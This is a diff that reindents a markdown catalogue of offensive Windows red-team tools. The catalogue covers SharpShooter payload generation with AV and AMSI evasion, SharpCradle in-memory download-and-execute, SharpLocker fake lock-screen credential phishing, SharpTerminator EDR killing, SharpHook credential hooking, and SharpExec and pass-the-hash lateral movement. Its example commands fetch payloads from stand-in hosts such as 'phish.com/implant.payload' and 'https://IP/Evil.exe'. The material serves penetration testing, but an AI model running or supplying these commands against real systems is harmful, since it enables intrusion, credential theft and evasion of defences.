@@ -627,13 +627,14 @@ SharPersist is a Windows persistence toolkit written in C# by Brett Hawkins (@h4
     
     ```
     
-    ## **SharpShooter**
+
+  ## **SharpShooter**
     
-    ### **Description**
+  ### **Description**
     
     SharpShooter is a versatile payload creation framework designed for the retrieval and execution of arbitrary CSharp source code. It is capable of generating payloads in various formats, including HTA, JS, VBS, and WSF. SharpShooter leverages James Forshaw's DotNetToJavaScript tool to invoke methods from a serialized .NET object. It supports payload retrieval via Web or DNS delivery and is compatible with the MDSec ActiveBreach PowerDNS project. SharpShooter can also generate stageless payloads with embedded shellcode execution in the same scripting formats.
     
-    ### **Features**
+  ### **Features**
     
     - **Multiple Payload Formats**: Supports HTA, JS, VBS, and WSF formats.
     - **Encrypted Payloads**: Uses RC4 encryption with a random key for modest anti-virus evasion.
@@ -644,13 +645,13 @@ SharPersist is a Windows persistence toolkit written in C# by Brett Hawkins (@h4
     - **Advanced Techniques in Version 1.0**: Includes COM staging, Squiblydoo and Squiblytwo execution, and XSL execution.
     - **AMSI Bypass in Version 2.0**: Adds an AMSI bypass module and support for generating VBA and Excel 4 macro-enabled documents.
     
-    ### **Usage - Command Line Mode**
+### **Usage - Command Line Mode**
     
     SharpShooter is highly configurable and supports various payload types, sandbox evasions, delivery methods, and output types. Running SharpShooter with the **`--help`** argument provides detailed usage information.
     
-    ### **Example Commands**
+### **Example Commands**
     
-    - **Stageless JavaScript Payload**:
+- **Stageless JavaScript Payload**:
         
         ```css
         SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
@@ -668,7 +669,7 @@ SharPersist is a Windows persistence toolkit written in C# by Brett Hawkins (@h4
         
         Generates a stageless HTA payload for .NET framework v2/3 with HTML smuggling.
         
-    - **Staged VBS Payload with Web and DNS Delivery**:
+- **Staged VBS Payload with Web and DNS Delivery**:
         
         ```scss
         SharpShooter.py --payload vbs --delivery both --output foo --web <http://www.foo.bar/shellcode.payload> --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
@@ -677,7 +678,7 @@ SharPersist is a Windows persistence toolkit written in C# by Brett Hawkins (@h4
         
         Creates a staged VBS payload that performs both Web and DNS delivery.
         
-    - **Custom CSharp inside VBS Payload**:
+- **Custom CSharp inside VBS Payload**:
         
         ```css
         SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web <http://www.phish.com/implant.payload> --output malicious --smuggle --template mcafee
@@ -686,7 +687,7 @@ SharPersist is a Windows persistence toolkit written in C# by Brett Hawkins (@h4
         
         Demonstrates creating a staged JS payload with custom CSharp code.
         
-    - **Creation of a Squiblytwo VBS Payload**:
+- **Creation of a Squiblytwo VBS Payload**:
         
         ```css
         SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com outlook --awlurl <http://192.168.2.8:8080/foo.xsl>
@@ -695,7 +696,7 @@ SharPersist is a Windows persistence toolkit written in C# by Brett Hawkins (@h4
         
         Generates a VBS payload using Squiblytwo technique with COM staging.
         
-    - **Creation of an Excel 4.0 SLK Macro Enabled Document**:
+- **Creation of an Excel 4.0 SLK Macro Enabled Document**:
         
         ```css
         SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
@@ -1202,9 +1203,9 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ```
     
-    ## **SharpCLMBypass**
+## **SharpCLMBypass**
     
-    ### **Description**
+### **Description**
     
     SharpCLMBypass is a tool designed to bypass the Constrained Language Mode in PowerShell using RunSpace in C#.
     
@@ -1224,18 +1225,18 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ---
     
-    ## **SharpLAPSPassword**
+## **SharpLAPSPassword**
     
-    ### **Description**
+### **Description**
     
     SharpLAPSPassword is a tool for searching and retrieving LAPS (Local Administrator Password Solution) passwords in a specified domain.
     
-    ### **Functionality**
+### **Functionality**
     
     - Searches for LAPS passwords in a domain.
     - Supports specifying domain controller, username, and password for the search.
     
-    ### **Example Commands**
+### **Example Commands**
     
     ```
     C:\\>SharpLAPSPassword.exe -d 192.168.1.10
@@ -1247,25 +1248,25 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ---
     
-    ## **SharpGmailC2**
+## **SharpGmailC2**
     
-    ### **Description**
+### **Description**
     
     SharpGmailC2 is a tool that uses Gmail as a command and control (C2) server. The implant exfiltrates data via SMTP and reads commands from the C2 server via the IMAP protocol.
     
-    ### **Functionality**
+### **Functionality**
     
     - Uses Gmail for data exfiltration and command reception.
     - Operates via SMTP for sending data and IMAP for receiving commands.
     
-    ### **Setup and Precautions**
+### **Setup and Precautions**
     
     - Enable POP Download and IMAP Access in Gmail settings.
     - Generate an App Password for the Gmail account.
     - Update the implant code with the appropriate email addresses and App Password.
     - Ensure commands sent via Gmail are marked as Unread.
     
-    ### **Example Commands**
+### **Example Commands**
     
     ```
     // Example usage not provided in the source. Typically involves executing the compiled binary and configuring the Gmail settings.
@@ -1274,18 +1275,18 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     [SharpGmailC2 on GitHub](https://github.com/reveng007/SharpGmailC2)
     
-    ## **SharpUp**
+## **SharpUp**
     
-    ### **Description**
+### **Description**
     
     SharpUp is a C# port of various PowerUp functionality, focusing on common vulnerability checks without weaponization functions.
     
-    ### **Functionality**
+### **Functionality**
     
     - Performs various vulnerability checks on Windows systems.
     - Includes an audit mode to run checks regardless of process integrity or group membership.
     
-    ### **Example Commands**
+### **Example Commands**
     
     ```
     SharpUp.exe audit
@@ -1298,18 +1299,18 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ---
     
-    ## **SharpCradle**
+## **SharpCradle**
     
-    ### **Description**
+### **Description**
     
     SharpCradle assists penetration testers or red teams in downloading and executing .NET binaries directly into memory.
     
-    ### **Functionality**
+### **Functionality**
     
     - Downloads and executes .NET binaries in memory.
     - Supports downloading from web servers and file servers, with or without credentials.
     
-    ### **Example Commands**
+### **Example Commands**
     
     ```
     SharpCradle.exe -w <https://IP/Evil.exe>
@@ -1323,25 +1324,25 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ---
     
-    ## **SharpLocker**
+## **SharpLocker**
     
-    ### **Description**
+### **Description**
     
     SharpLocker is a .NET application that simulates a Windows lock screen to phish for user credentials.
     
-    ### **Functionality**
+### **Functionality**
     
     - Displays a fake Windows lock screen.
     - Outputs captured credentials to the console, suitable for Cobalt Strike's execute-assembly module.
     - Designed to be run in memory to avoid disk interaction.
     
-    ### **How to Use**
+### **How to Use**
     
     - Compile SharpLocker from source.
     - Execute using memory injection techniques like Cobalt Strike's execute-assembly.
     - Wait for user credentials.
     
-    ### **Credits**
+### **Credits**
     
     - NetNTLMv2PasswordChecker by opdsealey.
     
@@ -1349,18 +1350,18 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ---
     
-    ## **SharpCOM**
+## **SharpCOM**
     
-    ### **Description**
+### **Description**
     
     SharpCOM is a C# port of Invoke-DCOM, designed for DCOM lateral movement.
     
-    ### **Functionality**
+### **Functionality**
     
     - Executes commands on remote systems using DCOM.
     - Intended for use with Cobalt Strike's execute-assembly module.
     
-    ### **Example Commands**
+### **Example Commands**
     
     ```
     execute-assembly /root/SharpCOM/SharpCOM.exe --Method ShellWindows --ComputerName host.example.local --Command "calc.exe"
@@ -1371,22 +1372,22 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
     
     ---
     
-    ## **SharpHound**
+## **SharpHound**
     
-    ### **Description**
+### **Description**
     
     SharpHound is a .NET tool for collecting data for BloodHound analysis.
     
-    ### **Functionality**
+### **Functionality**
     
     - Collects various types of data for Active Directory environments.
     - Supports multiple collection methods and options.
     
-    ### **CLI Options**
+### **CLI Options**
     
     - Various options for specifying collection methods, domain details, output settings, LDAP credentials, and more.
     
-    ### **Example Commands**
+### **Example Commands**
     
     ```
     dotnet SharpHound.dll -c All
@@ -1399,11 +1400,11 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
 
 ## **SharpClipHistory**
         
-        ### **Description**
+### **Description**
         
         SharpClipHistory is a specialized .NET 4.5 application written in C#. Its primary function is to access and read the clipboard history of a user on Windows 10, specifically for versions starting from Build 1809. This tool is particularly useful in cybersecurity contexts, especially in penetration testing and information gathering phases.
         
-        ### **Functionality**
+### **Functionality**
         
         The key functionality of SharpClipHistory lies in its ability to:
         
@@ -1412,7 +1413,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
         - Save images found in the clipboard history to a file.
         - Implement a KeePass bypass, which involves stopping KeePass if running, modifying its configuration file, and ensuring that passwords are saved in the clipboard history next time KeePass is launched.
         
-        ### **Build Steps**
+### **Build Steps**
         
         To compile SharpClipHistory, follow these steps:
         
@@ -1425,7 +1426,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
         
         A pre-built executable is also available for those who prefer not to compile the code themselves.
         
-        ### **Usage**
+### **Usage**
         
         To use SharpClipHistory, execute the following commands:
         
@@ -1465,7 +1466,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
             ```
             
         
-        ### **Example**
+### **Example**
         
         In a red teaming scenario, you might use SharpClipHistory as follows:
         
@@ -1483,13 +1484,13 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
         
         ```
         
-        ## **SharpRDPLog**
+## **SharpRDPLog**
         
-        ### **Description**
+### **Description**
         
         SharpRDPLog is a tool designed for Windows servers, primarily used in post-infiltration scenarios to collect information related to Remote Desktop Protocol (RDP). It's an effective tool for cybersecurity professionals, especially in penetration testing and digital forensics. The tool focuses on exporting various RDP-related records, including local RDP port information, Microsoft Terminal Services Client (mstsc) cache, cmdkey cache, and login success and failure logs.
         
-        ### **Functionality**
+### **Functionality**
         
         SharpRDPLog offers a range of functionalities, each targeting different aspects of RDP information gathering:
         
@@ -1511,7 +1512,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
             - Extracts events with IDs 4624 (login success) and 4625 (login failure) from the Windows event security log.
             - Reference: [SharpEventLog on GitHub](https://github.com/uknowsec/SharpEventLog)
         
-        ### **Example Commands**
+### **Example Commands**
         
         To use SharpRDPLog, the following commands can be executed:
         
@@ -1557,13 +1558,13 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
             
             ```
             
-            ## **SharpNamedPipePTH**
+## **SharpNamedPipePTH**
             
-            ### **Description**
+### **Description**
             
             SharpNamedPipePTH is a C# tool designed for user impersonation through Pass-the-Hash (PtH) authentication on a local Named Pipe. It's particularly useful in scenarios where you have the NTLM hash of a user account but cannot crack it or do not have access to a process owned by the user to execute shellcode or migrate into it. This tool is essential for offensive security professionals, especially in situations where local actions need to be performed as another user. The tool is based on the code from the project Sharp-SMBExec and is detailed in a blog post by the author.
             
-            ### **Functionality**
+### **Functionality**
             
             SharpNamedPipePTH allows for:
             
@@ -1573,7 +1574,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
             
             It's important to note that the tool requires local administrator rights or SEImpersonate privileges.
             
-            ### **Example Commands**
+### **Example Commands**
             
             SharpNamedPipePTH can be used in two main ways: executing a binary or executing shellcode. Here are some examples:
             
@@ -1598,13 +1599,13 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                 
                 This command uses shellcode generated by msfvenom for process execution.
                 
-                ## **SharpTerminator**
+## **SharpTerminator**
                 
-                ### **Description**
+### **Description**
                 
                 SharpTerminator is a C# port of the Terminator tool originally developed by ZeroMemoryEx. It serves as a utility for terminating Anti-Virus (AV) and Endpoint Detection and Response (EDR) processes on a compromised system. This tool is particularly useful in penetration testing and red team operations where AV/EDR solutions may hinder or detect malicious activities.
                 
-                ### **Functionality**
+### **Functionality**
                 
                 SharpTerminator offers the capability to:
                 
@@ -1614,7 +1615,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                 
                 The tool provides flexibility depending on the user's operational needs and constraints, such as the availability of upload functions in their Command and Control (C2) infrastructure.
                 
-                ### **Example Commands**
+### **Example Commands**
                 
                 - **Loading from Remote URL**:
                     
@@ -1634,7 +1635,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                     
                     This command loads the driver directly from a specified path on the disk to perform the termination of AV/EDR processes.
                     
-                - **Download Driver from Remote URL and Terminate AV/EDR**:
+- **Download Driver from Remote URL and Terminate AV/EDR**:
                     
                     ```
                     sharpterminator-url
@@ -1642,8 +1643,8 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                     ```
                     
                     A shorthand command for downloading and executing the driver from a remote URL.
-                    
-                - **Load Driver from Disk and Terminate AV/EDR**:
+
+  - **Load Driver from Disk and Terminate AV/EDR**:
                     
                     ```
                     sharpterminatsor-disk
@@ -1652,13 +1653,13 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                     
                     A shorthand command for loading and executing the driver from the disk.
                     
-                    ## **SharpHook**
+  ## **SharpHook**
                     
-                    ### **Description**
+### **Description**
                     
                     SharpHook, inspired by the SharpRDPThief project, is a tool designed for credential harvesting by using API hooks. It primarily targets Windows processes to extract credentials like usernames, passwords, and domain names. SharpHook leverages the EasyHook project to inject dependencies into the target process and then captures credentials, which are transmitted via EasyHook's Inter-Process Communication (IPC) server.
                     
-                    ### **Functionality**
+### **Functionality**
                     
                     SharpHook is capable of hooking into various processes and APIs to extract credentials. Its functionality varies depending on the target process:
                     
@@ -1681,7 +1682,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                         - Hooks into **`CredUnPackAuthenticationBufferW`**.
                         - Aims to capture username, password, and domain name from UAC prompts (Currently in progress).
                     
-                    ### **Example Commands**
+### **Example Commands**
                     
                     While specific commands for using SharpHook are not provided in the description, the general usage involves:
                     
@@ -1698,13 +1699,13 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                         - Monitor the IPC server for captured credentials.
                         - Extract and utilize the credentials as needed.
                         
-                        ## **SharpExec**
+## **SharpExec**
                         
-                        ### **Description**
+### **Description**
                         
                         SharpExec is an offensive security tool written in C# that facilitates lateral movement within a network. It's designed to assist penetration testers and red teamers in executing commands and deploying payloads on remote systems. The tool includes several modules, each providing different methods for executing commands or scripts on remote machines.
                         
-                        ### **Functionality**
+ ### **Functionality**
                         
                         SharpExec includes the following modules, each with its unique capabilities:
                         
@@ -1723,9 +1724,9 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                         
                         Future plans for SharpExec include adding lateral movement through DCOM and Pass-the-Hash functionality.
                         
-                        ### **Example Commands**
+### **Example Commands**
                         
-                        - **PSExec Module**:
+ - **PSExec Module**:
                             
                             - Upload and execute a file as NT Authority\System:
                                 
@@ -1740,8 +1741,8 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                                 SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\\Windows\\System32\\cmd.exe -c="My Args"
                                 
                                 ```
-                                
-                        - **WMI Module**:
+
+   - **WMI Module**:
                             
                             - Upload and execute a file as TargetUser:
                                 
@@ -1757,7 +1758,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                                 
                                 ```
                                 
-                        - **WMIExec Module**:
+- **WMIExec Module**:
                             
                             - Start a semi-interactive shell as TargetUser:
                                 
@@ -1766,7 +1767,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                                 
                                 ```
                                 
-                        - **SMBExec Module**:
+- **SMBExec Module**:
                             
                             - Start a semi-interactive shell as NT Authority\System:
                                 
@@ -1776,7 +1777,7 @@ SharpClipHistory is a .NET 4.5 application written in C#. It enables users to re
                                 ```
                                 
                         
-                        ### **Setup**
+### **Setup**
                         
                         To set up SharpExec:
                         
